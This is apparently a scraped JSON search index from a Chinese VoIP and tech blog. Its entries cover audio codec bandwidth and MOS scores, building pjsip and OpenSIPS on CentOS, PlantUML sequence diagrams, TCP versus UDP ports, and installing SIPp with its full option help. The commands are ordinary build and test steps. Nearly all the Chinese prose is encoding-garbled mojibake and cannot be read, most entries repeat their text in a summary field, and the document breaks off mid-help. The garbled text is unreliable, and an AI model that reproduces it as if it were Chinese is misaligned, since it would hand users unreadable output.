æ­¤20msçš„ä¸€ä¸ªåŒ…å°±æºå¸¦160å­—èŠ‚çš„æ•°æ®ã€‚\nåœ¨RTPåŒ…åè®®ä¸­ï¼Œ160å­—èŠ‚è¿˜è¦åŠ ä¸Š12ä¸ªè‡ªå·±çš„RTPå¤´ã€‚ åœ¨fsä¸Šå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹fsæ”¯æŒçš„ç¼–ç ã€‚\nshow codec ","permalink":"https://wdd.js.org/opensips/ch4/media-codec/","summary":" ç¼–ç  å¸¦å®½ MOS ç¯å¢ƒ ç‰¹ç‚¹ è¯´æ˜ G.711 64 kbps 4.45 LAN/WAN è¯­éŸ³è´¨é‡é«˜ï¼Œé€‚åˆå¯¹æ¥ç½‘å…³ G.711å®é™…ä¸Šå°±æ˜¯PCM, æ˜¯æœ€åŸºæœ¬çš„ç¼–ç æ–¹å¼ã€‚PCMåˆåˆ†ä¸ºä¸¤ç±»PCMA(g711a), PCMU(g711u)ã€‚ä¸­å›½ä½¿ç”¨çš„æ˜¯PCMA G.729 8 kbps 4.04 WAN å¸¦å®½å ç”¨ç‡å¾ˆå°ï¼ŒåŒæ—¶èƒ½ä¿è¯ä¸é”™çš„è¯­éŸ³è´¨é‡ åˆ†ä¸ºG729aå’ŒG729bä¸¤ç§ï¼ŒG729ä¹‹æ‰€ä»¥å¸¦å®½å ç”¨æ˜¯G711çš„1/8, æ˜¯å› ä¸ºG729çš„å‹ç¼©ç®—æ³•ä¸åŒã€‚G729ä¼ è¾“çš„ä¸æ˜¯çœŸæ­£çš„è¯­éŸ³ï¼Œè€Œæ˜¯è¯­éŸ³å‹ç¼©åçš„ç»“æœã€‚G729çš„ç¼–è§£ç æ˜¯ç”±ä¸“åˆ©çš„ï¼Œä¹Ÿå°±è¯´ä¸å…è´¹ã€‚ G.722 64 kbps 4.5 LAN è¯­éŸ³è´¨é‡é«˜ HD hdè¯­éŸ³ GSM 13.3 kbps 3.01 iLBA 13.3 15.2 æŠ—ä¸¢åŒ… OPUS 6-510 kbps - INTERNET OPUSçš„å¸¦å®½èŒƒå›´è·¨åº¦å¾ˆå¹¿ï¼Œé€‚åˆè¯­éŸ³å’Œè§†å± MOSå€¼ï¼ŒMean Opinion Scoreï¼Œç”¨æ¥å®šä¹‰è¯­éŸ³è´¨é‡ã€‚æ»¡åˆ†ä¸º5åˆ†ï¼Œæœ€ä½1åˆ†ã€‚\nMOS è´¨é‡ 5 æå¥½çš„ 4 ä¸é”™çš„ 3 è¿˜è¡Œå§ 2 ä¸­ç­‰å·® 1 æœ€å·® é€šå¸¸çš„æ‰“åŒ…æ˜¯20msä¸€ä¸ªåŒ…ï¼Œé‚£ä¹ˆä¸€ç§’å°±ä¼šä¼ è¾“1000/20=50ä¸ªåŒ…ã€‚å¦‚æœé‡‡æ ·è¯„ç‡æ˜¯8000Hz,Â é‚£ä¹ˆæ¯ä¸ªåŒ…çš„ä¼šæºå¸¦ 8000/50=160ä¸ªé‡‡æ ·æ•°æ®ã€‚åœ¨PCMAæˆ–è€…PCMUä¸­ï¼Œæ¯ä¸ªé‡‡æ ·æ•°æ®å ç”¨1å­—èŠ‚ã€‚å› æ­¤20msçš„ä¸€ä¸ªåŒ…å°±æºå¸¦160å­—èŠ‚çš„æ•°æ®ã€‚\nåœ¨RTPåŒ…åè®®ä¸­ï¼Œ160å­—èŠ‚è¿˜è¦åŠ ä¸Š12ä¸ªè‡ªå·±çš„RTPå¤´ã€‚ åœ¨fsä¸Šå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹fsæ”¯æŒçš„ç¼–ç ã€‚\nshow codec ","title":"å¸¸è§åª’ä½“æµç¼–ç åŠå…¶ç‰¹ç‚¹"},{"content":"ç¯å¢ƒè¯´æ˜ centos7.6 docker å®¹å™¨ è¿‡ç¨‹ wget https://www.pjsip.org/release/2.9/pjproject-2.9.zip unzip pjproject-2.9.zip cd pjproject-2.9 chmod +x configure aconfigure yum install gcc gcc-c++ make -y make dep make make install yum install centos-release-scl yum install rh-python36 å‚è€ƒ https://www.pjsip.org/download.htm https://trac.pjsip.org/repos/wiki/Getting-Started https://trac.pjsip.org/repos/wiki/Getting-Started/Autoconf https://linuxize.com/post/how-to-install-python-3-on-centos-7/ ","permalink":"https://wdd.js.org/opensips/tools/pjsip/","summary":"ç¯å¢ƒè¯´æ˜ centos7.6 docker å®¹å™¨ è¿‡ç¨‹ wget https://www.pjsip.org/release/2.9/pjproject-2.9.zip unzip pjproject-2.9.zip cd pjproject-2.9 chmod +x configure aconfigure yum install gcc gcc-c++ make -y make dep make make install yum install centos-release-scl yum install rh-python36 å‚è€ƒ https://www.pjsip.org/download.htm https://trac.pjsip.org/repos/wiki/Getting-Started https://trac.pjsip.org/repos/wiki/Getting-Started/Autoconf https://linuxize.com/post/how-to-install-python-3-on-centos-7/ ","title":"pjsip"},{"content":"å‰ç«¯ç»„ä»¶åŒ–æ—¶ï¼Œæœ‰ä¸ªå¾ˆæ—¶é«¦çš„è¯è¯­å«åšå…³æ³¨ç‚¹åˆ†ç¦»ï¼Œè¿™ä¸ªç”¨åœ¨ç»„ä»¶ä¸Šæ¯”è¾ƒå¥½ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå¤§çš„æ¨¡å—åˆ†å‰²æˆå°çš„æ¨¡å—ï¼Œé™ä½äº†æ•´ä¸ªæ¨¡å—çš„å¤æ‚åº¦ã€‚\nä½†æ˜¯æœ‰æ—¶å€™ï¼Œæˆ‘è§‰å¾—å…³æ³¨ç‚¹åˆ†ç¦»å¹¶ä¸å¥½ã€‚è¿™ä¸ªä¸æ˜¯æŒ‡åœ¨ä»£ç å¼€å‘è¿‡ç¨‹ï¼Œè€Œæ˜¯è§£å†³é—®é¢˜çš„è¿‡ç¨‹ã€‚\nå…³æ³¨ç‚¹åˆ†ç¦»çš„å¤„ç†æ–¹å¼ å‡å¦‚æˆ‘è¦è§£å†³é—®é¢˜Aï¼Œä½†æ˜¯åœ¨è§£å†³è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªæˆ‘ä¸çŸ¥é“çš„ä¸œè¥¿B, ç„¶åæˆ‘å°±å»ç ”ç©¶è¿™Bæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œç„¶åæ¥äºŒè¿ä¸‰ï¼Œæˆ‘ä»Bä¸€è·¯æ‰¾åˆ°äº†Zã€‚\nç„¶ååœ¨è¿™ä¸ªè§£å†³è¿‡ç¨‹è€½è¯¯ä¸€æ®µæ—¶å€™åï¼Œæ‰æƒ³èµ·æ¥ï¼šæˆ‘ä¹‹å‰æ˜¯è¦è§£å†³ä»€ä¹ˆé—®é¢˜æ¥ç€ï¼Ÿï¼Ÿ\nå…³æ³¨ç‚¹é›†ä¸­çš„å¤„ç†æ–¹å¼ ä¸è¦å†æ·±ç©¶çš„è·¯å¾„ä¸Šèµ°çš„å¤ªæ·± åœ¨èµ°å…¶ä»–è·¯å¾„æ—¶ï¼Œä¹Ÿä¸è¦å¿˜è®°æœ€åè¦å›åˆ°Aç‚¹ ","permalink":"https://wdd.js.org/posts/2019/09/xi7kpf/","summary":"å‰ç«¯ç»„ä»¶åŒ–æ—¶ï¼Œæœ‰ä¸ªå¾ˆæ—¶é«¦çš„è¯è¯­å«åšå…³æ³¨ç‚¹åˆ†ç¦»ï¼Œè¿™ä¸ªç”¨åœ¨ç»„ä»¶ä¸Šæ¯”è¾ƒå¥½ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå¤§çš„æ¨¡å—åˆ†å‰²æˆå°çš„æ¨¡å—ï¼Œé™ä½äº†æ•´ä¸ªæ¨¡å—çš„å¤æ‚åº¦ã€‚\nä½†æ˜¯æœ‰æ—¶å€™ï¼Œæˆ‘è§‰å¾—å…³æ³¨ç‚¹åˆ†ç¦»å¹¶ä¸å¥½ã€‚è¿™ä¸ªä¸æ˜¯æŒ‡åœ¨ä»£ç å¼€å‘è¿‡ç¨‹ï¼Œè€Œæ˜¯è§£å†³é—®é¢˜çš„è¿‡ç¨‹ã€‚\nå…³æ³¨ç‚¹åˆ†ç¦»çš„å¤„ç†æ–¹å¼ å‡å¦‚æˆ‘è¦è§£å†³é—®é¢˜Aï¼Œä½†æ˜¯åœ¨è§£å†³è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªæˆ‘ä¸çŸ¥é“çš„ä¸œè¥¿B, ç„¶åæˆ‘å°±å»ç ”ç©¶è¿™Bæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œç„¶åæ¥äºŒè¿ä¸‰ï¼Œæˆ‘ä»Bä¸€è·¯æ‰¾åˆ°äº†Zã€‚\nç„¶ååœ¨è¿™ä¸ªè§£å†³è¿‡ç¨‹è€½è¯¯ä¸€æ®µæ—¶å€™åï¼Œæ‰æƒ³èµ·æ¥ï¼šæˆ‘ä¹‹å‰æ˜¯è¦è§£å†³ä»€ä¹ˆé—®é¢˜æ¥ç€ï¼Ÿï¼Ÿ\nå…³æ³¨ç‚¹é›†ä¸­çš„å¤„ç†æ–¹å¼ ä¸è¦å†æ·±ç©¶çš„è·¯å¾„ä¸Šèµ°çš„å¤ªæ·± åœ¨èµ°å…¶ä»–è·¯å¾„æ—¶ï¼Œä¹Ÿä¸è¦å¿˜è®°æœ€åè¦å›åˆ°Aç‚¹ ","title":"å…³æ³¨ç‚¹åˆ†ç¦»çš„é—®é¢˜"},{"content":"webæœåŠ¡å™¨å¦‚æœæ˜¯åŸºäºtcpçš„ï¼Œé‚£ä¹ˆç”¨æ¥ç›‘å¬ç«¯å£ç«¯å£ä¾‹å¦‚80ï¼Œä¸€å®šåªèƒ½ç”¨æ¥æ¥æ”¶æ¶ˆæ¯ï¼Œè€Œä¸èƒ½ä»è¿™ä¸ªç«¯å£ä¸»åŠ¨å‘æ¶ˆæ¯å‡ºå»ã€‚\nä½†æ˜¯udpæœåŠ¡å™¨å°±ä¸ä¸€æ ·äº†ï¼ŒåŒä¸€ç«¯å£ï¼Œå³å¯ä»¥ç”¨æ¥åšlistençš„ç«¯å£ï¼Œä¹Ÿå¯ä»¥ä»è¿™ä¸ªç«¯å£ä¸»åŠ¨å‘æ¶ˆæ¯å‡ºå»ã€‚\n","permalink":"https://wdd.js.org/posts/2019/09/vc8oxs/","summary":"webæœåŠ¡å™¨å¦‚æœæ˜¯åŸºäºtcpçš„ï¼Œé‚£ä¹ˆç”¨æ¥ç›‘å¬ç«¯å£ç«¯å£ä¾‹å¦‚80ï¼Œä¸€å®šåªèƒ½ç”¨æ¥æ¥æ”¶æ¶ˆæ¯ï¼Œè€Œä¸èƒ½ä»è¿™ä¸ªç«¯å£ä¸»åŠ¨å‘æ¶ˆæ¯å‡ºå»ã€‚\nä½†æ˜¯udpæœåŠ¡å™¨å°±ä¸ä¸€æ ·äº†ï¼ŒåŒä¸€ç«¯å£ï¼Œå³å¯ä»¥ç”¨æ¥åšlistençš„ç«¯å£ï¼Œä¹Ÿå¯ä»¥ä»è¿™ä¸ªç«¯å£ä¸»åŠ¨å‘æ¶ˆæ¯å‡ºå»ã€‚","title":"TCPå’ŒUDPçš„åŒºåˆ«ç•…æƒ³"},{"content":"æˆ‘è§‰å¾—PlantUMLéå¸¸é€‚åˆç»˜åˆ¶æ—¶åºå›¾ï¼Œå…ˆç»™ä¸ªå®Œæ•´çš„ä¾‹å­ï¼Œæˆ‘ç»å¸¸ä¼šç”¨åˆ°çš„PlantUMLç”»SIPè¯·æ±‚æ—¶åºå›¾ã€‚\n@startuml autonumber alice-\u0026gt;bob: INVITE bob-[#green]\u0026gt;alice: 180 Ringing bob-[#green]\u0026gt;alice: 200 OK == talking == bob-[#green]\u0026gt;alice: BYE alice-\u0026gt;bob: 200 OK @enduml ç®€å•ç®­å¤´ \u0026ndash;\u0026gt; è™šçº¿ç®­å¤´ -\u0026gt; ç®€å•ç®­å¤´ -[#red]\u0026gt; å¸¦é¢œè‰²çš„ç®­å¤´ @startuml alice-\u0026gt;bob: INVITE bob--\u0026gt;alice: 180 Ringing @enduml å£°æ˜å‚ä¸è€…é¡ºåº å…ˆä½¿ç”¨participantå…³é”®å­—å£°æ˜äº†bobï¼Œ é‚£ä¹ˆbobå°±ä¼šå‡ºç°åœ¨æœ€å·¦è¾¹\n@startuml participant bob participant alice alice-\u0026gt;bob: INVITE bob-\u0026gt;alice: 180 Ringing @enduml å£°æ˜å‚ä¸è€…ç±»å‹ actor boundary control entity database @startuml participant start actor a boundary b control c entity d database e start-\u0026gt;a start-\u0026gt;b start-\u0026gt;c start-\u0026gt;d start-\u0026gt;e @enduml ç®­å¤´é¢œè‰² -[#red]\u0026gt; -[#0000ff]-\u0026gt; @startuml Bob -[#red]\u0026gt; Alice : hello Alice -[#0000FF]-\u0026gt;Bob : ok @enduml ç®­å¤´æ ·å¼ @startuml Bob -\u0026gt;x Alice Bob -\u0026gt; Alice Bob -\u0026gt;\u0026gt; Alice Bob -\\ Alice Bob \\\\- Alice Bob //-- Alice Bob -\u0026gt;o Alice Bob o\\\\-- Alice Bob \u0026lt;-\u0026gt; Alice Bob \u0026lt;-\u0026gt;o Alice @enduml ç®­å¤´è‡ªåŠ¨ç¼–å· è®¾ç½®autonumber\n@startuml autonumber alice-\u0026gt;bob: INVITE bob--\u0026gt;alice: 180 Ringing @enduml ","permalink":"https://wdd.js.org/posts/2019/09/hvscve/","summary":"æˆ‘è§‰å¾—PlantUMLéå¸¸é€‚åˆç»˜åˆ¶æ—¶åºå›¾ï¼Œå…ˆç»™ä¸ªå®Œæ•´çš„ä¾‹å­ï¼Œæˆ‘ç»å¸¸ä¼šç”¨åˆ°çš„PlantUMLç”»SIPè¯·æ±‚æ—¶åºå›¾ã€‚\n@startuml autonumber alice-\u0026gt;bob: INVITE bob-[#green]\u0026gt;alice: 180 Ringing bob-[#green]\u0026gt;alice: 200 OK == talking == bob-[#green]\u0026gt;alice: BYE alice-\u0026gt;bob: 200 OK @enduml ç®€å•ç®­å¤´ \u0026ndash;\u0026gt; è™šçº¿ç®­å¤´ -\u0026gt; ç®€å•ç®­å¤´ -[#red]\u0026gt; å¸¦é¢œè‰²çš„ç®­å¤´ @startuml alice-\u0026gt;bob: INVITE bob--\u0026gt;alice: 180 Ringing @enduml å£°æ˜å‚ä¸è€…é¡ºåº å…ˆä½¿ç”¨participantå…³é”®å­—å£°æ˜äº†bobï¼Œ é‚£ä¹ˆbobå°±ä¼šå‡ºç°åœ¨æœ€å·¦è¾¹\n@startuml participant bob participant alice alice-\u0026gt;bob: INVITE bob-\u0026gt;alice: 180 Ringing @enduml å£°æ˜å‚ä¸è€…ç±»å‹ actor boundary control entity database @startuml participant start actor a boundary b control c entity d database e start-\u0026gt;a start-\u0026gt;b start-\u0026gt;c start-\u0026gt;d start-\u0026gt;e @enduml ç®­å¤´é¢œè‰² -[#red]\u0026gt; -[#0000ff]-\u0026gt; @startuml Bob -[#red]\u0026gt; Alice : hello Alice -[#0000FF]-\u0026gt;Bob : ok @enduml ç®­å¤´æ ·å¼ @startuml Bob -\u0026gt;x Alice Bob -\u0026gt; Alice Bob -\u0026gt;\u0026gt; Alice Bob -\\ Alice Bob \\\\- Alice Bob //-- Alice Bob -\u0026gt;o Alice Bob o\\\\-- Alice Bob \u0026lt;-\u0026gt; Alice Bob \u0026lt;-\u0026gt;o Alice @enduml ç®­å¤´è‡ªåŠ¨ç¼–å· è®¾ç½®autonumber","title":"PlantUMLæ•™ç¨‹ åŒ…å­¦åŒ…ä¼š"},{"content":"å®‰è£…ä¾èµ– yum update \u0026amp;\u0026amp; yum install epel-release yum install openssl-devel mariadb-devel libmicrohttpd-devel \\ libcurl-devel libconfuse-devel ncurses-devel ç¼–è¯‘ ä¸‹é¢çš„è„šæœ¬ï¼Œé»˜è®¤å°†opensipså®‰è£…åœ¨/usr/local/etc/ç›®å½•ä¸‹\n\u0026gt; cd opensips-2.4.6 # ç¼–è¯‘ \u0026gt; make all -j4 include_modules=\u0026#34;db_mysql httpd db_http regex rest_client carrierroute dialplan\u0026#34; # å®‰è£… \u0026gt; make install include_modules=\u0026#34;db_mysql httpd db_http regex rest_client carrierroute dialplan\u0026#34; å¦‚æœæƒ³è¦æŒ‡å®šå®‰è£…ä½ç½®ï¼Œå¯ä»¥ä½¿ç”¨prefixå‚æ•°æŒ‡å®šï¼Œä¾‹å¦‚æŒ‡å®šå®‰è£…åœ¨/usr/aaaç›®å½•\n\u0026gt; cd opensips-2.4.6 # ç¼–è¯‘ \u0026gt; make all -j4 prefix=/usr/aaa include_modules=\u0026#34;db_mysql httpd db_http regex rest_client carrierroute dialplan\u0026#34; # å®‰è£… \u0026gt; make install prefix=/usr/aaa include_modules=\u0026#34;db_mysql httpd db_http regex rest_client carrierroute dialplan\u0026#34; ","permalink":"https://wdd.js.org/opensips/ch3/centos-install/","summary":"å®‰è£…ä¾èµ– yum update \u0026amp;\u0026amp; yum install epel-release yum install openssl-devel mariadb-devel libmicrohttpd-devel \\ libcurl-devel libconfuse-devel ncurses-devel ç¼–è¯‘ ä¸‹é¢çš„è„šæœ¬ï¼Œé»˜è®¤å°†opensipså®‰è£…åœ¨/usr/local/etc/ç›®å½•ä¸‹\n\u0026gt; cd opensips-2.4.6 # ç¼–è¯‘ \u0026gt; make all -j4 include_modules=\u0026#34;db_mysql httpd db_http regex rest_client carrierroute dialplan\u0026#34; # å®‰è£… \u0026gt; make install include_modules=\u0026#34;db_mysql httpd db_http regex rest_client carrierroute dialplan\u0026#34; å¦‚æœæƒ³è¦æŒ‡å®šå®‰è£…ä½ç½®ï¼Œå¯ä»¥ä½¿ç”¨prefixå‚æ•°æŒ‡å®šï¼Œä¾‹å¦‚æŒ‡å®šå®‰è£…åœ¨/usr/aaaç›®å½•\n\u0026gt; cd opensips-2.4.6 # ç¼–è¯‘ \u0026gt; make all -j4 prefix=/usr/aaa include_modules=\u0026#34;db_mysql httpd db_http regex rest_client carrierroute dialplan\u0026#34; # å®‰è£… \u0026gt; make install prefix=/usr/aaa include_modules=\u0026#34;db_mysql httpd db_http regex rest_client carrierroute dialplan\u0026#34; ","title":"centos7 å®‰è£…opensips"},{"content":"å®‰è£… SIPp 3.3 # è§£å‹ tar -zxvf sipp-3.3.990.tar.gz # centos å®‰è£…ä¾èµ– yum install lksctp-tools-devel libpcap-devel gcc-c++ gcc -y # ubuntu å®‰è£…ä»¥æ¥ apt-get install -y pkg-config dh-autoreconf ncurses-dev build-essential libssl-dev libpcap-dev libncurses5-dev libsctp-dev lksctp-tools ./configure --with-sctp --with-pcap make \u0026amp;\u0026amp; make install sipp -v SIPp v3.4-beta1 (aka v3.3.990)-SCTP-PCAP built Oct 6 2019, 20:12:17. This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version. é™„ä»¶ sipp-3.3.990.tar.gz\nä½¿ç”¨é»˜è®¤åœºæ™¯ uas sipp -sn uas -i 192.168.2.101 -sn è¡¨ç¤ºä½¿ç”¨é»˜è®¤åœºæ™¯æ–‡ä»¶ uas ä½œä¸ºsipæœåŠ¡å™¨ uac ä½œä¸ºsipå®¢æˆ·ç«¯ -i è®¾ç½®æœ¬åœ°ipç»™Contactå¤´ demoåœºæ™¯ sippæ¨¡æ‹ŸsipæœåŠ¡å™¨ï¼Œå½“æ”¶åˆ°inviteä¹‹åï¼Œå…ˆè¿”å›100ï¼Œç„¶åè¿”å›183ï¼Œç„¶åè¿”å›500\né¦–å…ˆæˆ‘ä»¬å°†sippå†…ç½®çš„uasåœºæ™¯æ–‡ä»¶æ‹¿å‡ºæ¥ï¼ŒåŸºäºè¿™ä¸ªåœºæ™¯æ–‡ä»¶åšä¿®æ”¹\nç”Ÿæˆé…ç½®æ–‡ä»¶ sipp -sd uas \u0026gt; uas.xml ç¼–è¾‘é…ç½®æ–‡ä»¶\nå¯åŠ¨uas\nsipp -sf uas.xml -i 192.168.40.77 -p 18627 -bg -skip_rlimit å¸®åŠ©æ–‡æ¡£ Usage: sipp remote_host[:remote_port] [options] Available options: -v : Display version and copyright information. -aa : Enable automatic 200 OK answer for INFO, UPDATE and NOTIFY messages. -auth_uri : Force the value of the URI for authentication. By default, the URI is composed of remote_ip:remote_port. -au : Set authorization username for authentication challenges. Default is taken from -s argument -ap : Set the password for authentication challenges. Default is \u0026#39;password\u0026#39; -base_cseq : Start value of [cseq] for each call. -bg : Launch SIPp in background mode. -bind_local : Bind socket to local IP address, i.e. the local IP address is used as the source IP address. If SIPp runs in server mode it will only listen on the local IP address instead of all IP addresses. -buff_size : Set the send and receive buffer size. -calldebug_file : Set the name of the call debug file. -calldebug_overwrite: Overwrite the call debug file (default true). -cid_str : Call ID string (default %u-%p@%s). %u=call_number, %s=ip_address, %p=process_number, %%=% (in any order). -ci : Set the local control IP address -cp : Set the local control port number. Default is 8888. -d : Controls the length of calls. More precisely, this controls the duration of \u0026#39;pause\u0026#39; instructions in the scenario, if they do not have a \u0026#39;milliseconds\u0026#39; section. Default value is 0 and default unit is milliseconds. -deadcall_wait : How long the Call-ID and final status of calls should be kept to improve message and error logs (default unit is ms). -default_behaviors: Set the default behaviors that SIPp will use. Possbile values are: - all\tUse all default behaviors - none\tUse no default behaviors - bye\tSend byes for aborted calls - abortunexp\tAbort calls on unexpected messages - pingreply\tReply to ping requests If a behavior is prefaced with a -, then it is turned off. Example: all,-bye -error_file : Set the name of the error log file. -error_overwrite : Overwrite the error log file (default true). -f : Set the statistics report frequency on screen. Default is 1 and default unit is seconds. -fd : Set the statistics dump log report frequency. Default is 60 and default unit is seconds. -i : Set the local IP address for \u0026#39;Contact:\u0026#39;,\u0026#39;Via:\u0026#39;, and \u0026#39;From:\u0026#39; headers. Default is primary host IP address. -inf : Inject values from an external CSV file during calls into the scenarios. First line of this file say whether the data is to be read in sequence (SEQUENTIAL), random (RANDOM), or user (USER) order. Each line corresponds to one call and has one or more \u0026#39;;\u0026#39; delimited data fields. Those fields can be referred as [field0], [field1], ... in the xml scenario file. Several CSV files can be used simultaneously (syntax: -inf f1.csv -inf f2.csv ...) -infindex : file field Create an index of file using field. For example -inf users.csv -infindex users.csv 0 creates an index on the first key. -ip_field : Set which field from the injection file contains the IP address from which the client will send its messages. If this option is omitted and the \u0026#39;-t ui\u0026#39; option is present, then field 0 is assumed. Use this option together with \u0026#39;-t ui\u0026#39; -l : Set the maximum number of simultaneous calls. Once this limit is reached, traffic is decreased until the number of open calls goes down. Default: (3 * call_duration (s) * rate). -log_file : Set the name of the log actions log file. -log_overwrite : Overwrite the log actions log file (default true). -lost : Set the number of packets to lose by default (scenario specifications override this value). -rtcheck : Select the retransmisison detection method: full (default) or loose. -m : Stop the test and exit when \u0026#39;calls\u0026#39; calls are processed -mi : Set the local media IP address (default: local primary host IP address) -master : 3pcc extended mode: indicates the master number -max_recv_loops : Set the maximum number of messages received read per cycle. Increase this value for high traffic level. The default value is 1000. -max_sched_loops : Set the maximum number of calsl run per event loop. Increase this value for high traffic level. The default value is 1000. -max_reconnect : Set the the maximum number of reconnection. -max_retrans : Maximum number of UDP retransmissions before call ends on timeout. Default is 5 for INVITE transactions and 7 for others. -max_invite_retrans: Maximum number of UDP retransmissions for invite transactions before call ends on timeout. -max_non_invite_retrans: Maximum number of UDP retransmissions for non-invite transactions before call ends on timeout. -max_log_size : What is the limit for error and message log file sizes. -max_socket : Set the max number of sockets to open simultaneously. This option is significant if you use one socket per call. Once this limit is reached, traffic is distributed over the sockets already opened. Default value is 50000 -mb : Set the RTP echo buffer size (default: 2048). -message_file : Set the name of the message log file. -message_overwrite: Overwrite the message log file (default true). -mp : Set the local RTP echo port number. Default is 6000. -nd : No Default. Disable all default behavior of SIPp which are the following: - On UDP retransmission timeout, abort the call by sending a BYE or a CANCEL - On receive timeout with no ontimeout attribute, abort the call by sending a BYE or a CANCEL - On unexpected BYE send a 200 OK and close the call - On unexpected CANCEL send a 200 OK and close the call - On unexpected PING send a 200 OK and continue the call - On any other unexpected message, abort the call by sending a BYE or a CANCEL -nr : Disable retransmission in UDP mode. -nostdin : Disable stdin. -p : Set the local port number. Default is a random free port chosen by the system. -pause_msg_ign : Ignore the messages received during a pause defined in the scenario -periodic_rtd : Reset response time partition counters each logging interval. -plugin : Load a plugin. -r : Set the call rate (in calls per seconds). This value can bechanged during test by pressing \u0026#39;+\u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;*\u0026#39; or \u0026#39;/\u0026#39;. Default is 10. pressing \u0026#39;+\u0026#39; key to increase call rate by 1 * rate_scale, pressing \u0026#39;-\u0026#39; key to decrease call rate by 1 * rate_scale, pressing \u0026#39;*\u0026#39; key to increase call rate by 10 * rate_scale, pressing \u0026#39;/\u0026#39; key to decrease call rate by 10 * rate_scale. If the -rp option is used, the call rate is calculated with the period in ms given by the user. -rp : Specify the rate period for the call rate. Default is 1 second and default unit is milliseconds. This allows you to have n calls every m milliseconds (by using -r n -rp m). Example: -r 7 -rp 2000 ==\u0026gt; 7 calls every 2 seconds. -r 10 -rp 5s =\u0026gt; 10 calls every 5 seconds. -rate_scale : Control the units for the \u0026#39;+\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;*\u0026#39;, and \u0026#39;/\u0026#39; keys. -rate_increase : Specify the rate increase every -fd units (default is seconds). This allows you to increase the load for each independent logging period. Example: -rate_increase 10 -fd 10s ==\u0026gt; increase calls by 10 every 10 seconds. -rate_max : If -rate_increase is set, then quit after the rate reaches this value. Example: -rate_increase 10 -rate_max 100 ==\u0026gt; increase calls by 10 until 100 cps is hit. -no_rate_quit : If -rate_increase is set, do not quit after the rate reaches -rate_max. -recv_timeout : Global receive timeout. Default unit is milliseconds. If the expected message is not received, the call times out and is aborted. -send_timeout : Global send timeout. Default unit is milliseconds. If a message is not sent (due to congestion), the call times out and is aborted. -sleep : How long to sleep for at startup. Default unit is seconds. -reconnect_close : Should calls be closed on reconnect? -reconnect_sleep : How long (in milliseconds) to sleep between the close and reconnect? -ringbuffer_files: How many error/message files should be kept after rotation? -ringbuffer_size : How large should error/message files be before they get rotated? -rsa : Set the remote sending address to host:port for sending the messages. -rtp_echo : Enable RTP echo. RTP/UDP packets received on port defined by -mp are echoed to their sender. RTP/UDP packets coming on this port + 2 are also echoed to their sender (used for sound and video echo). -rtt_freq : freq is mandatory. Dump response times every freq calls in the log file defined by -trace_rtt. Default value is 200. -s : Set the username part of the resquest URI. Default is \u0026#39;service\u0026#39;. -sd : Dumps a default scenario (embeded in the sipp executable) -sf : Loads an alternate xml scenario file. To learn more about XML scenario syntax, use the -sd option to dump embedded scenarios. They contain all the necessary help. -shortmessage_file: Set the name of the short message log file. -shortmessage_overwrite: Overwrite the short message log file (default true). -oocsf : Load out-of-call scenario. -oocsn : Load out-of-call scenario. -skip_rlimit : Do not perform rlimit tuning of file descriptor limits. Default: false. -slave : 3pcc extended mode: indicates the slave number -slave_cfg : 3pcc extended mode: indicates the file where the master and slave addresses are stored -sn : Use a default scenario (embedded in the sipp executable). If this option is omitted, the Standard SipStone UAC scenario is loaded. Available values in this version: - \u0026#39;uac\u0026#39; : Standard SipStone UAC (default). - \u0026#39;uas\u0026#39; : Simple UAS responder. - \u0026#39;regexp\u0026#39; : Standard SipStone UAC - with regexp and variables. - \u0026#39;branchc\u0026#39; : Branching and conditional branching in scenarios - client. - \u0026#39;branchs\u0026#39; : Branching and conditional branching in scenarios - server. Default 3pcc scenarios (see -3pcc option): - \u0026#39;3pcc-C-A\u0026#39; : Controller A side (must be started after all other 3pcc scenarios) - \u0026#39;3pcc-C-B\u0026#39; : Controller B side. - \u0026#39;3pcc-A\u0026#39; : A side. - \u0026#39;3pcc-B\u0026#39; : B side. -stat_delimiter : Set the delimiter for the statistics file -stf : Set the file name to use to dump statistics -t : Set the transport mode: - u1: UDP with one socket (default), - un: UDP with one socket per call, - ui: UDP with one socket per IP address The IP addresses must be defined in the injection file. - t1: TCP with one socket, - tn: TCP with one socket per call, - l1: TLS with one socket, - ln: TLS with one socket per call, - s1: SCTP with one socket (default), - sn: SCTP with one socket per call, - c1: u1 + compression (only if compression plugin loaded), - cn: un + compression (only if compression plugin loaded). This plugin is not provided with sipp. -timeout : Global timeout. Default unit is seconds. If this option is set, SIPp quits after nb units (-timeout 20s quits after 20 seconds). -timeout_error : SIPp fails if the global timeout is reached is set (-timeout option required). -timer_resol : Set the timer resolution. Default unit is milliseconds. This option has an impact on timers precision.Small values allow more precise scheduling but impacts CPU usage.If the compression is on, the value is set to 50ms. The default value is 10ms. -T2 : Global T2-timer in milli seconds -sendbuffer_warn : Produce warnings instead of errors on SendBuffer failures. -trace_msg : Displays sent and received SIP messages in \u0026lt;scenario file name\u0026gt;_\u0026lt;pid\u0026gt;_messages.log -trace_shortmsg : Displays sent and received SIP messages as CSV in \u0026lt;scenario file name\u0026gt;_\u0026lt;pid\u0026gt;_shortmessages.log -trace_screen : Dump statistic screens in the \u0026lt;scenario_name\u0026gt;_\u0026lt;pid\u0026gt;_screens.log file when quitting SIPp. Useful to get a final status report in background mode (-bg option). -trace_err : Trace all unexpected messages in \u0026lt;scenario file name\u0026gt;_\u0026lt;pid\u0026gt;_errors.log. -trace_calldebug : Dumps debugging information about aborted calls to \u0026lt;scenario_name\u0026gt;_\u0026lt;pid\u0026gt;_calldebug.log file. -trace_stat : Dumps all statistics in \u0026lt;scenario_name\u0026gt;_\u0026lt;pid\u0026gt;.csv file. Use the \u0026#39;-h stat\u0026#39; option for a detailed description of the statistics file content. -trace_counts : Dumps individual message counts in a CSV file. -trace_rtt : Allow tracing of all response times in \u0026lt;scenario file 